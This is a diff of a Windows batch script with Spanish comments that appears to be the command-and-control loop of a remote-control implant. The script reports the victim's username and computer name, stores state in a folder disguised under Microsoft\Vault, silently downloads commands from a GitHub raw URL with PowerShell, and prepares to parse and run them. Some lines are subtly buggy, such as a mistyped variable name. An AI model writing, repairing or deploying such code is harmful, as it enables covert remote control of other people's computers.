@@ -11,8 +11,10 @@ if %errorlevel% neq 0 (
 :: Configuración de la Memoria
 set "MEM_DIR=%AppData%\Roaming\Microsoft\Vault\data"
 set "MEM_FILE=%MEM_DIR%\last_id.txt"
-set "PRUEBA=VER6_%USERNAME%_%COMPUTERNAME%_%USERDOMAIN%"
+set "ID_NUBE=%temp%\id_temp.txt"
 
+
+set "PRUEBA=VER6_%USERNAME%_%COMPUTERNAME%"
 call :FUNC_REPORTAR "!PRUEBA!" 
 :: Crear la carpeta si no existe (la primera vez)
 if not exist "%MEM_DIR%" mkdir "%MEM_DIR%"
@@ -22,32 +24,28 @@ set "URL_COMANDOS=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAss
 
 
 :: Descargamos el archivo de comandos
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_COMANDOS%', '%MEM_FILE%')" >nul 2>&1
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_COMANDOS%', '%ID_NUBE%')" >nul 2>&1
 
 :: Si el archivo está vacío o no se descargó, morimos
-if not exist "%MEM_FILE%" exit
-for %%i in ("%MEM_FILE%") do if %%~zi == 0 (del "%MEM_FILE%" & exit)
+if not exist "%ID_NUBE%" exit
+for %%i in ("%ID_NUBE%") do if %%~zi == 0 (del "%MID_NUBE%" & exit)
 
-
-:: --- 3. LECTURA DEL ID (PRIMERA LÍNEA) ---
-:: 'set /p' lee solo la primera línea del archivo
-set /p LINEA1=<"%MEM_FILE%"
-            
-:: Extraemos el valor después de "ID:"
-set "ID_NUBE=%LINEA1:ID:=%"
-
-:: Leer el ID guardado en la PC
+set /p LINEA_NUBE=<"%ID_NUBE%"
+:: 2. Comprobar si existe el archivo de memoria local
 if exist "%MEM_FILE%" (
-    set /p ID_LOCAL=<"%MEM_FILE%"
+    set /p LINEA_LOCAL=<"%MEM_FILE%"
 ) else (
-    set "ID_LOCAL=0"
+    set "%MEM_FILE%=%ID_NUBE%"
+    set "LINEA_LOCAL=0"
+) 
+if "!LINEA_LOCAL!"=="!LINEA_NUBE!" (
+    del "%ID_NUBE%"
+    exit
+) else (
+    copy "%ID_NUBE%" "%MEM_FILE%"
+    del "%ID_NUBE%" 
 )
 
-:: COMPARACIÓN RELÁMPAGO
-if "!ID_NUBE!"=="!ID_LOCAL!" (
-    del "%MEM_FILE%"
-    exit
-)
 :: --- 4. PROCESAMIENTO DE COMANDOS (Parsing) ---
 :: Leemos el archivo línea por línea
 :: Cambiamos 'tokens=*' por 'tokens=1,2,3' para que separe por espacios
